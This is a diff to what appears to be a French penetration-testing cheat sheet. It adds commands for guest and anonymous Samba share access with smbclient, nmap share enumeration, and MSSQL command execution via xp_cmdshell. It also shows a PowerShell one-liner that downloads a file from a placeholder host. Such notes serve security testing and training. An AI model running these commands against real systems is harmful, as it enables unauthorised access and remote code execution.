@@ -26,6 +26,39 @@
 
 `net account` information sur la politique de mot de passe
 
+## Samba
+
+#### smbclient
+Exemple de share connus: IPC$, 
+Connexion en tant qu'utilisateur Guest
+
+```
+smbclient -U guest% \\\\host\\share
+```
+
+Connexion en tant qu'anonyme
+
+```
+smbclient -U "" -N \\\\host\\share
+```
+
+Énumération de share
+
+```
+nmap -v --script smb-enum-shares -p U:137,T:139 host
+```
+
+## MSSQL
+
+#### sqsh
+
+
+```
+sqsh -S 1.2.3.4 -u user
+EXEC master..xp_cmdshell 'whoami'
+go
+```
+
 <h2>Powershell</h2>
 
 `{(New-Object System.Net.WebClient).DownloadFile("http://site.com/file", "C:\\Users\Public\file")}` → Wget en powershell
